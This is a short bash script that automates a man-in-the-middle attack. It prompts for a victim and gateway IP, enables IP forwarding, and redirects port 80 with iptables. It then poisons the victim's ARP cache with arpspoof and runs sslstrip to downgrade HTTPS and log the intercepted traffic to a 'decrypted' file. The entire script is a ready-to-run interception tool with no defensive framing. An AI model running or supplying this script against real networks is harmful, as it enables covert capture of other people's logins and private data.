#!/usr/bin/env bash

# By David B. Cortarello (Nomius) <dcortarello@gmail@com>

function cleanup()
{
	echo -n "Removing forwarding"
	iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
	echo ${BEFORE} > /proc/sys/net/ipv4/ip_forward
	echo -e " [OK]"
	echo -n "Ending arpspoofing"
	kill ${ARP_PID}
	echo -e " [OK]"
   	echo -n "Ending slstrip"
	kill ${SSL_PID}
	echo -e " [OK]"
	exit 0
}

if [ $# -ne 2 ]; then
	read -p "Insert the victim IP: " VICTIM
	read -p "Insert the gateway IP: " GATEWAY
else
	VICTIM="${1}"
	GATEWAY="${2}"
fi

trap cleanup INT

echo -n "Forwarding requests from port 80 to port 10000"
BEFORE=$(cat /proc/sys/net/ipv4/ip_forward)
echo 1 > /proc/sys/net/ipv4/ip_forward
modprobe ipt_REDIRECT
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
echo -e " [OK]"

echo -n "Initializing arp spoofing"
arpspoof -i eth0 -t ${VICTIM} ${GATEWAY} &>/dev/null &
ARP_PID=$!
echo -e " [OK]"

LOG="decrypted-$(date +%Y-%m-%d-%H-%M-%S).log"
echo -n "Listening for data and saving in log file: ${LOG}"
sslstrip -w ${LOG} &
SSL_PID=$!
echo -e " [OK]"

while true; do
	sleep 20
done
